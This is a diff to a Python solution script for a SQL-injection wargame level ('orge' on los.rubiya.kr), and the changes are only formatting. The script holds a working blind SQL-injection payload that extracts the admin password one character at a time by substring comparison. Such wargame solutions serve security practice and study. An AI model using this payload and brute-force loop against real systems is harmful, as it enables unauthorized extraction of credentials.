@@ -3,13 +3,14 @@ filter = or, and
 '''
 
 import urllib.request
-from urllib.parse import quote # url encoding func
+from urllib.parse import quote  # url encoding func
 
 url = 'http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw='
 result = ""
 pwlen = 0
 
 __author__ = "goodasd123@naver.com - h4lo"
+
 
 def req(query):
     re = urllib.request.Request(query)
@@ -31,7 +32,8 @@ for i in range(0, 10):
 
 for i in range(1, pwlen + 1):
     for j in range(ord('0'), (ord('z') + 1)):
-        add_url = "' || id='admin' && substr(pw, 1, {})='{}' -- ;".format(i, result + chr(j))
+        add_url = f"' || id='admin' && substr(pw, 1, {i})=\
+                    '{result + chr(j)}' -- ;"
         query = url + quote(add_url)
 
         if str(req(query).read()).find('Hello admin') != -1:
